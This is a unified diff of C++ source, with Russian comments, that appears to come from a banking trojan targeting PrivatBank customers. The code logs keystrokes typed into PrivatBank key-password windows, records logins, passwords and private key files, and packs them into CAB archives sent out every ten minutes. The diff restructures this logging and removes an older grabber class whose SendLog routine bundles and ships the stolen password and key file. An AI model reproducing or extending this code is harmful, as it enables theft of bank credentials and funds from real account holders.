@@ -81,7 +81,7 @@ bool PrivatBank::Initialize(HWND Wnd, DWORD  WndClassHash)
 		return false;
 
 	// Определяем текст окна
-	string WndText = GetWndText(Wnd);
+	string WndText = GetWndText2(Wnd);
 	int WndType = TPrivatBank::IsKeyPassWnd(WndText);
 	if (!WndType) return false;
 
@@ -182,6 +182,7 @@ bool TPrivatBank::InitializeMainLog()
 		if (Created)
 		{
 			FLog->SetSendAsCAB(true);
+//			FLog->SetSendInterval(300000);
 			FLog->SetSendInterval(600000);  // Задержка 10 минут
         }
 	}
@@ -193,6 +194,16 @@ bool TPrivatBank::InitializeMainLog()
 //------------------------------------------------
 void TPrivatBank::AddLoginAndPassword(const string& Login, const string& Password)
 {
+	// При авторизации, закрываем старый лог
+	if (FLog)
+	{
+		delete FLog;
+		FLog = NULL;
+	}
+
+	TGrabberFile Log(Name());
+	Log.CloseLog();
+
 	if (InitializeMainLog())
 	{
 		FLog->AddText(GetStr(EStrLogFieldLogin), Login);
@@ -206,7 +217,9 @@ void TPrivatBank::AddLoginAndPassword(const string& Login, const string& Passwor
 void TPrivatBank::AddKeyFile(const string& FileName)
 {
 	if (InitializeMainLog())
+	{
 		FLog->AddFile("Key", FileName, "Key", NULL);
+	}
 }
 
 
@@ -222,11 +235,7 @@ void TPrivatBank::ActivateKeyPassLogger(HWND Wnd, const string& WndText, int Wnd
 	// Определяем имя поля
 	FKeyPassFieldName = GetStr(EStrLogFieldKeyPassword);
 	if (WndType == 2)
-	{
-		string N;
-		N.LongToStr(WndType);
-		FKeyPassFieldName += N;
-	}
+		FKeyPassFieldName += "2";
 
 	// Получаем имя файла ключа из заголовка окна
 	if (WndType == 1) ParseKeyFileName(WndText);
@@ -290,7 +299,9 @@ void TPrivatBank::LogKeyboad(HWND aWnd, const char* Text)
 	if (aWnd == FKeyPassWnd)
 	{
 		if (FLog)
+		{
 			FLog->AddTextPart(FKeyPassWnd, FKeyPassFieldName, Text);
+		}
     }
 }
 
@@ -318,52 +329,5 @@ void TPrivatBank::DoEvent(int EventId, LPVOID Param)
 
 
 
-
-//*****************************************************
-//  Грабер пароля ключа приватбанка
-//*****************************************************
-
-TPrivatBankKeyPassword::TPrivatBankKeyPassword(HWND aWnd, const string& WndText)
-	: TGrabber(GetStr(EStrPrivatBankGrabber))
-{
-}
-
-TPrivatBankKeyPassword::~TPrivatBankKeyPassword()
-{
-
-}
-
-
-//------------------------------------------
-//  Функция отправляет лог
-//------------------------------------------
-bool TPrivatBankKeyPassword::SendLog()
-{
-	PRVDBG("PrivatKeyPass", "Отправляем лог\rPassword=%s", FPassword.t_str());
-	if (FPassword.IsEmpty()) return false;
-
-	LPVOID Cab = OpenCab();
-	if (!Cab) return false;
-
-	TBotStrings Fields;
-	Fields.ValueDelimeter = ": ";
-	Fields.AddValue(GetStr(EStrLogFieldPassword), FPassword);
-
-	AddStringToCab(Cab, Fields.GetText(), GetStr(StrLogFileTextData));
-
-	// Добавляем файл ключа
-	if (!FKeyFileName.IsEmpty())
-	{
-		string ShortName = GetStr(EStrLogKeyPath);
-		ShortName += Slash;
-		ShortName += File::ExtractFileNameA(FKeyFileName.t_str(), false);
-		AddFileToCab(Cab, FKeyFileName.t_str(), ShortName.t_str());
-	}
-
-	// Закрываем каб и отправляем лог
-	CloseCab(true);
-
-	return true;
-}
 
 
